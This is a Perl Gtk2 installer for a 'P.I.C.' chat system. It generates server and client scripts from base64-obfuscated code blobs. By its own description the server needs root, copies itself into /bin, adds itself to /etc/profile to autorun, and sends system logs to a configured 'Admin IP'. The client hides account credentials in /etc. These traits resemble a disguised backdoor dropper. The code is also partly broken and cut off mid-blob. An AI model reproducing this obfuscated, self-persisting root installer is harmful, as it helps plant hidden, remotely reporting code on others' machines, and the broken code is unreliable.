#!/usr/bin/perl
# coded by cross <cross@x1machine.com>
# homepage: http://x1machine.com
use Gtk2 '-init';
####################################################
# some constants
sub decry ($){ local($^W) = 0;my $str = shift;my $res = "";
$str =~ tr|A-Za-z0-9+=/||cd;$str =~ s/=+$//;  $str =~ tr|A-Za-z0-9+/| -_|;  
while ($str =~ /(.{1,60})/gs) {my $len = chr(32 + length($1)*3/4); 
$res .= unpack("u", $len . $1 ); }$res;}

my $description = "Work title: Private Internet Communication System
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Coded by Dmitry
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Description: This open source messaging system supposed\n to provide secure communication to any of its users.
This installer will generate 3 files: Manager, Client, Server,\n using data provided by you.
Help: \nAutorun file - where is server's autorun applications\nfor example on my machine it is /etc/profile
Log file- P.I.C. server will need it\n for example /etc/p.i.c_log.txt
Admin IP - your IP where server should send system logs
MYSQL Host - where your mysql daemon resides, usually localhost\nMYSQL Login - your mysql login
MYSQL Pass - your mysql password\nMYSQL Database - your mysql database
MYSQL Table - mysql table which will store users\n(will be created by server)\nServer IP - machine's IP where you will put the server
Server Port - port opened by server\nClient Port - port opened on user machine
RC4 Key -  RC4 key to use\nServer Name - name of the server / executable
Splitter - a special symbol that is used for \nsplitting messages, commands etc
better use some rarely used symbol, and , \nby the way, this symbol / letter will 
be not allowed in messages, niknames etc.
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Notice*: to use P.I.C. system the only thing you need on \nyour server is MYSQL deamon.
Then you have to create mysql database and table and then put your
mysql settings into the entry widgets of this installer. \nWhen each field is filled, hit 'Generate Files'
Button, this will generate 3 files, next hit 'Run Server' \nButton, this will run P.I.C. Daemon.
P.I.C. Daemon will add itself to the profile file\nto start itself if you will reboot your main server.
Also, it will copy itself to /bin directory,\nthat is why it needs root access.";

my ($AutoRunFile, $LogFile, $AdminIP, $MYSQLHost, $MYSQLLogin, $MYSQLPass, $MYSQLDatabase, 
	$MYSQLTable, $ServerIP, $ServerPort, $ClientPort, $RC4Key, $ServerName, $Splitter);
#####################################################
print "//=========================================//\n";
print "P.I.C. System Installer\n";
print "Notice*: if you want this installer to run the server after all\n";
print "files are generated, you need to run this script as root!\n";
print "Please, chose method: ([1] GUI / [2] Terminal / [3] Exit)\n";
print "//=========================================//\n";
chomp(my $x1 = <stdin>);
if($x1 == 1) {goto GuiInstaller;} elsif($x1 == 2){goto TerminalInstaller;}elsif($x1 == 3){goto theend;}
GuiInstaller:
$core= new Gtk2::Window( "toplevel" );
$core->set_title( "P.I.C. System Installer" );
$core->set_default_size( 600, 400 );
$core->signal_connect(delete_event => sub { Gtk2->main_quit });
$core->set_border_width(2); 
Gtk2::Rc->parse ('/usr/share/themes/Qt/gtk-2.0/gtkrc');
$label = new Gtk2::VBox( 0, 5 ); $vb = new Gtk2::VBox( 0, 5 );
$hb = new Gtk2::HBox( 0, 5 ); $label3 = new Gtk2::VBox( 0, 5 ); $core->add( $hb );
my $table = new Gtk2::Table( 5, 5, 0 ); $table->set_row_spacing( 0, 5 ); $table->set_col_spacing( 0, 0 );
my $vb = Gtk2::VBox->new(0, 5);
my $display = Gtk2::TextView->new;
my $buffer = $display->get_buffer;
$display->set_editable(0);
my $scroll = Gtk2::ScrolledWindow->new(undef, undef);
$scroll->set_policy('automatic', 'automatic');
$scroll->set_size_request (500, 465);
$scroll->set_shadow_type('in');
$scroll->add($display);
$table->add($scroll);

$display->modify_font(Gtk2::Pango::FontDescription->from_string("monospace"));
$buffer->create_tag("command", "foreground", "blue");
$buffer->create_tag("data", "foreground", "black");
$buffer->create_tag("error", "foreground", "red");
sub display {
    my ($level, $text) = @_;
    $buffer->insert_with_tags_by_name($buffer->get_end_iter, "$text\n", $level);
}
my ($text, $fixed_font);
my $button2 = new Gtk2::Button( "Close" );
    $button2->signal_connect( 'clicked', sub { Gtk2->main_quit } );
my $button3 = new Gtk2::Button( "Clear" );
    $button3->signal_connect( "clicked", sub { my $clearbuffer = $display->get_buffer;
$clearbuffer->delete($clearbuffer->get_start_iter, $clearbuffer->get_end_iter);
$display->set_buffer($clearbuffer);} );

my $button4 = new Gtk2::Button( "About & Help" );
    $button4->signal_connect( "clicked", sub { display('error', ($description)); } );

my $button5 = new Gtk2::Button( "Check if MYSQL is running" );
    $button5->signal_connect( "clicked", sub { 
my ($stdout,$stderr) = $shell;
$shell = qxx("/usr/bin/mysqladmin -u root -p version");
display('error', ($shell)); 
} );

my $button6 = new Gtk2::Button( "Run Server!" );
    $button6->signal_connect( "clicked", sub { display('error', ($description)); } );

$hb->pack_start( $label, 0, 0, 0 ); $hb->pack_start( $vb, 0, 0, 0 );
$hb->pack_start( $label3, 0, 0, 1 ); 
my $p_ = new Gtk2::VButtonBox(); $p_->set_border_width(5);
$p_->set_spacing( $spacing );
my $p_2 = new Gtk2::VButtonBox(); $p_2->set_border_width(5);
$p_2->set_spacing( $spacing );
#######################################
$ent = new Gtk2::Entry(); 
$ent2 = new Gtk2::Entry(); 
$ent3 = new Gtk2::Entry(); 
$ent4 = new Gtk2::Entry(); 
$ent5 = new Gtk2::Entry(); 
$ent6 = new Gtk2::Entry();
$ent7 = new Gtk2::Entry(); 
$ent8 = new Gtk2::Entry(); 
$sepme =  Gtk2::HSeparator->new;
$sepme2 =  Gtk2::HSeparator->new;
$ent9 = new Gtk2::Entry(); 
$ent10 = new Gtk2::Entry(); 
$ent11 = new Gtk2::Entry(); 
$ent12 = new Gtk2::Entry(); 
$sepme3 =  Gtk2::HSeparator->new;
$ent13 = new Gtk2::Entry(); 
$ent14 = new Gtk2::Entry(); 
#########################################
my $button = new Gtk2::Button("Generate Files!");
#$button->signal_connect(clicked=>\&dos, [$ent, $ent2, $ent3]);
my $hcmd = new Gtk2::Label("AutoRun File"); my $hcmd2 = new Gtk2::Label("Log File");
my $hcmd3 = new Gtk2::Label("Admin IP"); my $sepo = Gtk2::HSeparator->new;
my $hcmd4 = new Gtk2::Label("MYSQL Host"); my $hcmd5 = new Gtk2::Label("MYSQL Login");
my $hcmd6 = new Gtk2::Label("MYSQL Pass"); my $hcmd7 = new Gtk2::Label("MYSQL Database");
my $hcmd8 = new Gtk2::Label("MYSQL Table"); my $sepo2 = Gtk2::HSeparator->new;
my $hcmd9 = new Gtk2::Label("Server IP"); my $hcmd10 = new Gtk2::Label("Server Port");
my $hcmd11 = new Gtk2::Label("Client Port"); my $hcmd12 = new Gtk2::Label("RC4 Key");
my $sepo3 = Gtk2::HSeparator->new; my $hcmd13 = new Gtk2::Label("Server Name");
my $hcmd14 = new Gtk2::Label("Splitter");

$frame = new Gtk2::Frame("Data"); $frame->add( $p_ );
$vb->pack_start( $frame, 0, 0, 0 ); $vb->pack_start( $button, 0, 0, 0 );$vb->pack_start( $button4, 1, 1, 1 );
$frame2 = new Gtk2::Frame("Settings"); $frame2->add( $p_2 );
$label->pack_start( $frame2, 0, 0, 0 ); $label->pack_start( $button2, 1, 1, 1 );$label->pack_start( $button3, 0, 0, 0 );
$frame3 = new Gtk2::Frame("Output");$frame3->add( $table );
$label3->pack_start( $frame3, 0, 0, 0 ); $label3->pack_start( $button5, 0, 0, 0 ); $label3->pack_start( $button6, 0, 0, 0 );

$p_->add($ent); $p_->add($ent2); $p_->add($ent3); 
$p_->add($sepme);$p_->add($ent4);$p_->add($ent5);
$p_->add($ent6);$p_->add($ent7);$p_->add($ent8);$p_->add($sepme2);
$p_->add($ent9);$p_->add($ent10);$p_->add($ent11);$p_->add($ent12); $p_->add($sepme3);
$p_->add($ent13);$p_->add($ent14);

$p_2->add($hcmd);$p_2->add($hcmd2);$p_2->add($hcmd3);
$p_2->add($sepo); 
$p_2->add($hcmd4); $p_2->add($hcmd5); $p_2->add($hcmd6); 
$p_2->add($hcmd7); $p_2->add($hcmd8); $p_2->add($sepo2); 
$p_2->add($hcmd9); $p_2->add($hcmd10); $p_2->add($hcmd11); 
$p_2->add($hcmd12); $p_2->add($sepo3); $p_2->add($hcmd13);  $p_2->add($hcmd14); 

$button->signal_connect(clicked=>sub {
$AutoRunFile = $ent->get_text; $LogFile = $ent2->get_text; $AdminIP = $ent3->get_text;
$MYSQLHost = $ent4->get_text; $MYSQLLogin = $ent5->get_text;  $MYSQLPass = $ent6->get_text;
$MYSQLDatabase = $ent7->get_text; $MYSQLTable = $ent8->get_text; $ServerIP = $ent9->get_text;
$ServerPort = $ent10->get_text; $ClientPort = $ent11->get_text; $RC4Key = $ent12->get_text;
$ServerName = $ent13->get_text; $Splitter = $ent14->get_text;
&GenerateUserConsole();
});

$core->show_all(); Gtk2->main;
exit(0);

TerminalInstaller:
system "clear";
print $description;
print "\nAutorun file: "; chomp($AutoRunFile = <stdin>);
print "Log file: "; chomp($LogFile = <stdin>);
print "Admin IP: "; chomp($AdminIP = <stdin>);
print "MYSQL Host: "; chomp($MYSQLHost = <stdin>);
print "MYSQL Login: "; chomp($MYSQLLogin = <stdin>);
print "MYSQL Pass: "; chomp($MYSQLPass = <stdin>);
print "MYSQL Database: "; chomp($MYSQLDatabase = <stdin>);
print "MYSQL Table: "; chomp($MYSQLTable = <stdin>);
print "Server IP: "; chomp($ServerIP = <stdin>);
print "Server Port: "; chomp($ServerPort = <stdin>);
print "Client Port: "; chomp($ClientPort = <stdin>);
print "RC4 Key: "; chomp($RC4Key = <stdin>);
print "Server Name: "; chomp($ServerName = <stdin>);
print "Splitter: "; chomp($Splitter = <stdin>);
print "Do you want to generate files now? (yes | no)";
chomp(my $response = <stdin>);
if($response eq "yes") {} elsif($response eq "no"){die "nothing to do, exiting"; }
print "Do you want to run server now?";
chomp(my $response_ex = <stdin>);
if($response_ex eq "yes") {} elsif($response_ex eq "no"){die "nothing to do, exiting"; }
exit(0);

theend:
print "//=========================================//\n";
print "P.I.C. System Installer\n";
print "Exited. Have a nice day.\n";
print "//=========================================//\n";
exit(0);


sub GenerateServer {
my $part1 = "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c
use DBI;
use CGI;
my \$ServerName = \"$ServerName\";
my \$db = \"$MYSQLDatabase\"; 
my \$dbhost =\"$MYSQLHost\"; 
my \$dbuser = \"$MYSQLLogin\"; 
my \$dbpass = \"$MYSQLPass\"; 
my \$table = \"$MYSQLTable\";
my \$SEND_PORT = $ServerPort; 
my \$server_host = \"$ServerIP\"; 
my \$proto = 'udp'; 
my \$RC4pass = \"$RC4Key\"; 
my \$MASTER_IP = \"$AdminIP\";
my \$LogFile = \"/etc/p.i.c_log.txt\";
my \$AutoRunFile = \"/etc/profile\";
";

my $file1 = "server";
open(LOGFILE,">>$file1") or die("Cannot create file $file1!\n");
        print LOGFILE ("$part1");
	print LOGFILE (decry($part2));
	print LOGFILE (decry($part3));
	print LOGFILE (decry($part4));
	print LOGFILE (decry($part5));
        close(LOGFILE);
	system ("chmod 777 $file1");

}

sub GenerateUserConsole {
my $part1 = "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c
my \$server_host = \"$ServerIP\";	
my \$pass = \"$RC4Key\";	# RC4 password
my \$MAXLEN = 1024;	# data lengh
my \$LISTEN_PORT 	= $ClientPort;	
my \$SEND_PORT 	= $ServerPort;	
my \$tag_send	= getlogin;
my \$tag_receive 	= 'mrX';
my \$proto = 'udp';	# do not change this!
my \$tview; 
##################################
my \$J =\"$Splitter\"; # splitter
";
my $part2 = "
cGFja2FnZSBHdGsyOjpIZWxwZXI7CnVzZSBHbGliOwkKc3ViIGFkZF93YXRjaCB7c2hpZnQ7IG15ICgkZmQsICRjb25kLCAkY2FsbGJhY2ssICRkYXRhKSA9IEBfOwokY29uZCA9ICRjb25kIGVxICdpbicgID8gJ0dfSU9fSU4nICA6ICRjb25kIGVxICdvdXQnID8gJ0dfSU9fT1VUJyA6CnByaW50ICJJbnZhbGlkIGNvbmRpdGlvbiBmbGFnLiBFeHBlY3Rpbmc6ICdpbicgLyAnb3V0JyI7Cm15ICR0YWcgPSB7IGlvX2lkICA9PiBHbGliOjpJTy0+YWRkX3dhdGNoICgkZmQsICRjb25kLCAkY2FsbGJhY2ssICRkYXRhKSwKaHVwX2lkID0+IEdsaWI6OklPLT5hZGRfd2F0Y2ggKCRmZCwgJ0dfSU9fSFVQJywgJGNhbGxiYWNrLCAkZGF0YSksfTsKcmV0dXJuICR0YWc7fQoKdXNlIElPOjpTb2NrZXQ7CQp1c2UgR3RrMiAtaW5pdDsJCgpzdWIgY3J5ICgkOyQpeyBteSAkcmVzID0gIiI7IG15ICRlb2wgPSAkX1sxXTsgJGVvbCA9ICJcbiIgdW5sZXNzIGRlZmluZWQgJGVvbDsJCnBvcygkX1swXSkgPSAwOyB3aGlsZSAoJF9bMF0gPX4gLyguezEsNDV9KS9ncykgeyRyZXMgLj0gc3Vic3RyKHBhY2soJ3UnLCAkMSksIDEpO2Nob3AoJHJlcyk7fQokcmVzID1+IHRyfGAgLV98QUEtWmEtejAtOSsvfDsgIG15ICRwYWRkaW5nID0gKDMgLSBsZW5ndGgoJF9bMF0pICUgMykgJSAzOwokcmVzID1+IHMvLnskcGFkZGluZ30kLyc9JyB4ICRwYWRkaW5nL2UgaWYgJHBhZGRpbmc7aWYgKGxlbmd0aCAkZW9sKSB7CiRyZXMgPX4gcy8oLnsxLDc2fSkvJDEkZW9sL2c7fSAkcmVzO30KCnN1YiBkZWNyeSAoJCl7IGxvY2FsKCReVykgPSAwO215ICRzdHIgPSBzaGlmdDtteSAkcmVzID0gIiI7CQokc3RyID1+IHRyfEEtWmEtejAtOSs9L3x8Y2Q7JHN0ciA9fiBzLz0rJC8vOyAgJHN0ciA9fiB0cnxBLVphLXowLTkrL3wgLV98OyAgCndoaWxlICgkc3RyID1+IC8oLnsxLDYwfSkvZ3MpIHtteSAkbGVuID0gY2hyKDMyICsgbGVuZ3RoKCQxKSozLzQpOyAKJHJlcyAuPSB1bnBhY2soInUiLCAkbGVuIC4gJDEgKTsgfSRyZXM7fQoKJE1BWF9DSFVOS19TSVpFID0gMTAyNCB1bmxlc3MgJE1BWF9DSFVOS19TSVpFOwpzdWIgbmV3IHtteSAoICRjbGFzcywgJGtleSApICA9IEBfOyBteSAkc2VsZiA9IGJsZXNzIHt9LCAkY2xhc3M7ICRzZWxmLT57c3RhdGV9ID0gU2V0dXAoICRrZXkgKTsKJHNlbGYtPnt4fSA9IDA7JHNlbGYtPnt5fSA9IDA7JHNlbGY7fQpzdWIgUkM0IHtteSAkc2VsZjtteSggQHN0YXRlLCAkeCwgJHkgKTtpZiAoIHJlZiAkX1swXSApIHskc2VsZiA9IHNoaWZ0O0BzdGF0ZSA9IEB7ICRzZWxmLT57c3RhdGV9IH07CiR4ID0gJHNlbGYtPnt4fTskeSA9ICRzZWxmLT57eX07fSBlbHNlIHtAc3RhdGUgPSBTZXR1cCggc2hpZnQgKTskeCA9ICR5ID0gMDt9Cm15ICRtZXNzYWdlID0gc2hpZnQ7bXkgJG51bV9waWVjZXMgPSBkbyB7bXkgJG51bSA9IGxlbmd0aCgkbWVzc2FnZSkgLyAkTUFYX0NIVU5LX1NJWkU7Cm15ICRpbnQgPSBpbnQgJG51bTskaW50ID09ICRudW0gPyAkaW50IDogJGludCsxO307Zm9yIG15ICRwaWVjZSAoIDAuLiRudW1fcGllY2VzIC0gMSApIHsKbXkgQG1lc3NhZ2UgPSB1bnBhY2sgIkMqIiwgc3Vic3RyKCRtZXNzYWdlLCAkcGllY2UgKiAkTUFYX0NIVU5LX1NJWkUsICRNQVhfQ0hVTktfU0laRSk7CmZvciAoIEBtZXNzYWdlICkgeyR4ID0gMCBpZiArKyR4ID4gMjU1OyR5IC09IDI1NiBpZiAoJHkgKz0gJHN0YXRlWyR4XSkgPiAyNTU7CkBzdGF0ZVskeCwgJHldID0gQHN0YXRlWyR5LCAkeF07JF8gXj0gJHN0YXRlWyggJHN0YXRlWyR4XSArICRzdGF0ZVskeV0gKSAlIDI1Nl07fQpzdWJzdHIoJG1lc3NhZ2UsICRwaWVjZSAqICRNQVhfQ0hVTktfU0laRSwgJE1BWF9DSFVOS19TSVpFKSA9IHBhY2sgIkMqIiwgQG1lc3NhZ2U7fQppZiAoJHNlbGYpIHskc2VsZi0+e3N0YXRlfSA9IFxAc3RhdGU7JHNlbGYtPnt4fSA9ICR4OyRzZWxmLT57eX0gPSAkeTt9JG1lc3NhZ2U7fQpzdWIgU2V0dXAge215IEBrID0gdW5wYWNrKCAnQyonLCBzaGlmdCApO215IEBzdGF0ZSA9IDAuLjI1NTtteSAkeSA9IDA7Zm9yIG15ICR4ICgwLi4yNTUpIHsKJHkgPSAoICRrWyR4ICUgQGtdICsgJHN0YXRlWyR4XSArICR5ICkgJSAyNTY7QHN0YXRlWyR4LCAkeV0gPSBAc3RhdGVbJHksICR4XTt9d2FudGFycmF5ID8gQHN0YXRlIDogXEBzdGF0ZTt9
";

my $part3 = "
JHR2aWV3ID0gR3RrMjo6VGV4dFZpZXctPm5ldygpOyBteSAkc29ja01haW47IG15ICgkZmQsJGNvbmRpdGlvbiwkZmgpOyBteSAkdGFnX3NlbmQ7Cm15ICRidWZmRXggPSAkdHZpZXctPmdldF9idWZmZXIoKTsgbXkgJG51bWJlcl9vZl91c2VyczsgbXkgJHVzZXJzX2NvbnRhaW5lcjsgbXkgJHhheGE7Cm15IEBkZXRhaWxzOyBteSAkcm9vdHBhc3N3ZDsgbXkgJHJvb3Rsb2dpbjsgbXkgJG1zZzsgCm15ICRlbnRfc2VuZCA9IEd0azI6OkVudHJ5LT5uZXc7IApteSAkdWx0aW1hID0gJHJvb3Rsb2dpbi4iOiIuJHJvb3RwYXNzd2Q7IG15ICRtc2dfc2VuZDsKCm15ICR0cmVlX3N0b3JlID0gR3RrMjo6VHJlZVN0b3JlLT5uZXcocXcvR2xpYjo6U3RyaW5nLyk7Cm15ICR0cmVlX3ZpZXcgPSBHdGsyOjpUcmVlVmlldy0+bmV3KCR0cmVlX3N0b3JlKTsKbXkgJHRyZWVfY29sdW1uID0gR3RrMjo6VHJlZVZpZXdDb2x1bW4tPm5ldygpOwpteSAkTmV3VFZpZXcyID0gR3RrMjo6VGV4dFZpZXctPm5ldygpOyBteSAkTmV3QnVmZm9yMiA9ICROZXdUVmlldzItPmdldF9idWZmZXIoKTsKbXkgJHByaXZhdGVfZW50X3NlbmQgPSBHdGsyOjpFbnRyeS0+bmV3KCk7CgpzdWIgTWVzc2FnZUJveCB7IG15ICRtZXNzYWdlID0gc2hpZnQ7IG15ICR0aXRsZSA9IHNoaWZ0OwpteSAkZGlhbG9nID0gR3RrMjo6RGlhbG9nLT5uZXcgKCR0aXRsZSwgJHdpbmRvdywgJ2Rlc3Ryb3ktd2l0aC1wYXJlbnQnLCAnZ3RrLW9rJyA9PiAnbm9uZScpOwpteSAkbGFiZWwgPSBHdGsyOjpMYWJlbC0+bmV3ICgkbWVzc2FnZSk7ICRkaWFsb2ctPnZib3gtPmFkZCAoJGxhYmVsKTsKJGRpYWxvZy0+c2lnbmFsX2Nvbm5lY3QgKHJlc3BvbnNlID0+IHN1YiB7ICRfWzBdLT5kZXN0cm95IH0pOyAkZGlhbG9nLT5zaG93X2FsbDt9CgpHdGsyOjpSYy0+cGFyc2UgKCcvdXNyL3NoYXJlL3RoZW1lcy9RdC9ndGstMi4wL2d0a3JjJyk7CgpzdWIgQWJvdXQgewpNZXNzYWdlQm94KAoiIFByaXZhdGUgSW50ZXJuZXQgQ29tbXVuaWNhdGlvbiBDaGF0IFN5c3RlbSBjb2RlZCBieSBjcm9zcyA8Y3Jvc3NcQHgxbWFjaGluZS5jb20+IC8gCiBjc3JzcyBmcm9tIGh0dHA6Ly9mb3J1bS5hbnRpY2hhdC5ydQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIFRvIHJlZ2lzdGVyIHNpbXBseSB0eXBlIGluIE1haW4gRW50cnkgZGVzaXJlZCB1c2VybmFtZSBwYXNzd29yZCBhbmQgeW91ciB2YWxpZCBlbWFpbCBhZGRyZXNzLCBzZXBhcmF0ZWQgd2l0aCAKICckSicgLCBsaWtlICB0aGlzJEogeW91cl9uYW1lJEpceW91cl9wYXNzJEpceW91cl9tYWlsIGFuZCB0aGVuIGhpdCAnUmVnaXN0ZXInIGJ1dHRvbi4gU2NyaXB0IHdpbGwgc2VuZCB5b3VyIHJlcXVlc3QgdG8gCiB0aGUgc2VydmVyLCB0aGF0IHdpbGwgdHJ5IHRvIHJlZ2lzdGVyIHlvdS4gQWZ0ZXIgc3VjY2Vzc2Z1bCByZWdpc3RyYXRpb24geW91IHdpbGwgYmUgYWJsZSB0byBqb2luIFAuSS5DLiBjaGF0IDopCiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiBJZiB5b3UgaGF2ZSBhbGxyZWFkeSByZWdpc3RlcmVkIGJ1dCB0aGVyZSBpcyBzb21lIGlzc3VlIHdpdGggYXV0byBsb2dpbiwgc2ltcGx5IHR5cGUgaW4gTWFpbiBFbnRyeSB5b3VyIGxvZ2luIAogYW5kIHBhc3N3b3JkLCBzZXBhcmF0ZWQgd2l0aCAnJEonIGxpa2UgdGhpczogIHlvdXJfbmFtZSRKXHlvdXJfcGFzcyBhbmQgaGl0ICdMb2dpbicgYnV0dG9uLiAKIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogQnkgVGhlIFdheSwgdGhpcyBjb25zb2xlIHdpbGwgY3JlYXRlIGEgaGlkZGVuIGZpbGUgaW5zaWRlIC9ldGMgZGlyZWN0b3J5LCBpbiB3aGljaCBpdCB3aWxsIHN0b3JlIHlvdXIgYWNjb3VudCBkZXRhaWxlcyAKIHRvIGJlIGFibGUgdG8gYXV0byBsb2cgeW91IGluLgogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiBPbmUgbW9yZSB0aGluZywgdGhlcmUgaXMgbm8gJ1NlbmQgbWVzc2FnZScgYm90dG9ucy4gWW91IGRvbnQgbmVlZCB0aGVtLCBzaW1wbHkgYWZ0ZXIgeW91IGhhdmUgZW50ZXJlZCB5b3VyIAogbWVzc2FnZSwgaGl0IEVOVEVSIG9uIHlvdXIga2V5Ym9hcmQgYW5kIHlvdXIgbWVzc2FnZSB3aWxsIGJlIHNlbnQuIEkgdGhpbmsgbm8gb25lIGlzIHVzaW5nIHN1Y2ggYnV0dG9ucyBzbyAKIGkgaGF2ZSBkZWNpZGVkIHRvIG5vdCB0byBhZGQgdGhlbS4KIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogTm93IHNtYWxsIGV4YW1wbGFuYXRpb24sIGhvdyB0byB1c2UgdGhpcyB0aGluZy4gQWZ0ZXIgeW91IHdpbGwgcmVnaXN0ZXIgYW4gYWNjb3VudCwgaGl0ICdVcGRhdGUgdXNlciBsaXN0JyAKIGJ1dHRvbiB0byBzZWUgd2hvIGlzIGhlcmUsIHdobyBpcyBvbmxpbmUgYW5kIHdobyBpcyBvZmZsaW5lLiBPbmxpbmUgcGVvcGxlIGFyZSBpbmRpY2F0ZWQgYnkgWytdLCBvZmZsaW5lIC0gWy1dLgogU29tZXRpbWVzIHlvdSBuZWVkIHRvIHJlZnJlc2ggdXNlcnMgdHdpY2UgdG8gc2VlIGNoYW5nZXMuIEluIG1haW4gZW50cnkgeW91IGFyZSB3cml0aW5nIG1lc3NhZ2VzIHRvIAogZXZlcnlvbmUgb25saW5lOyBwcml2YXRlIGVudHJ5IHNlbmRzIHlvdXIgbWVzc2FnZSBvbmx5IHRvIHNlbGVjdGVkIHVzZXIuIFRvIHNlbmQgcHJpdmF0ZSBtZXNzYWdlLCB5b3UgCiBuZWVkIHRvIHNlbGVjdCB1c2VyIGZyb20gdXNlciBsaXN0LCB0eXBlIHlvdXIgbXNnIGFuZCBoaXQgRU5URVIuIFRoYXRzIGl0LiBIYXZlIGZ1bi4KIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogQW5kIHBsZWFzZSwgaWYgeW91IHdpbGwgZmluZCBhbnkgYnVncyAoaSdtIHN1cmUgdGhlcmUgYXJlIG1hbnkpLCBzZW5kIG1lIGluZm8gYWJvdXQgdGhlbSBzbyBpIGNhbiBpbXByb3ZlCiB0aGUgY29kZS4KIiwgIkFCT1VUIiApO30KCgpzdWIgcm90NDcge215ICgkc3RyKT1AXzskc3RyID1+IHRyLyEtfi9QLX4hLU8vO3JldHVybiAkc3RyO30KJVJldCA9ICggJ1JldHVybicgPT4gMHhmZjBkKTsKCnN1YiBtYWtlQ29ubmVjdGlvbiB7CiRzb2NrTWFpbiA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhMb2NhbFBvcnQgPT4gJExJU1RFTl9QT1JULCBQcm90byA9PiAkcHJvdG8pIG9yICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAic29ja01haW46ICRAISBcbiIpOwpHdGsyOjpIZWxwZXItPmFkZF93YXRjaCAoIGZpbGVubyAkc29ja01haW4sICdpbicsc3VieyAoJGZkLCRjb25kaXRpb24sJGZoKSA9IEBfO1wmd2F0Y2hfY2FsbGJhY2soJGZoLCR0dmlldyk7fSwkc29ja01haW4pOwp9CiZtYWtlQ29ubmVjdGlvbigpOwoKbXkgJHdpbmRvdyA9IEd0azI6OldpbmRvdy0+bmV3KCd0b3BsZXZlbCcpOwokd2luZG93LT5zaWduYWxfY29ubmVjdCgnZGVsZXRlX2V2ZW50JyA9PiBzdWIgeyAKbXkgJHNlbmRfc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsClBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6IFxuJCFcbiIpOwpteSAkZW5jb2RlZDAgPSByb3Q0NygibG9nX29mIi4kSi4ibWUiKTsKbXkgJGVuY1JDNCA9IFJDNCggJHBhc3MsICRlbmNvZGVkMCApOwokc2VuZF9zb2NrLT5zZW5kKCRlbmNSQzQpIG9yICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAic2VuZDogJCFcbiIpOyAKZXhpdDsKfSk7CiR3aW5kb3ctPnNldF9wb3NpdGlvbignY2VudGVyX2Fsd2F5cycpOwokd2luZG93LT5zZXRfcmVzaXphYmxlKDEpOwokd2luZG93LT5zZXRfYm9yZGVyX3dpZHRoKDUpOwokd2luZG93LT5zZXRfdGl0bGUoIlJlbW90ZSBDb21tdW5pY2F0aW9uIE1vZHVsZSIpOwpteSAoJHZib3gpID0gJk1haW5Cb3goKTsKJHdpbmRvdy0+YWRkKCR2Ym94KTsKJHdpbmRvdy0+c2hvdygpOwoKb3BlbihGMiwiL2V0Yy8uUC5JLkNfREFUQS50eHQiKSB8fCAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIk5vIGRhdGEhIEhhdmUgeW91IHJlZ2lzdGVyZWQ/XG4iKTsgCm15ICRkZXRhaWxzID0gZGVjcnkoPEYyPik7CkBsb2dpbl9wYXNzID0gc3BsaXQoLyRKLywgJGRldGFpbHMpOwokcm9vdGxvZ2luID0gJGxvZ2luX3Bhc3NbMF07ICRyb290cGFzc3dkID0gJGxvZ2luX3Bhc3NbMV07CiR0YWdfc2VuZCA9ICRsb2dpbl9wYXNzWzBdOwpteSAkbXNnX3NlbmQgPSAiYXV0aCRKIi4kcm9vdGxvZ2luLiRKLiRyb290cGFzc3dkLiRKLiIwIjsKbXkgJHNlbmRfc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsClB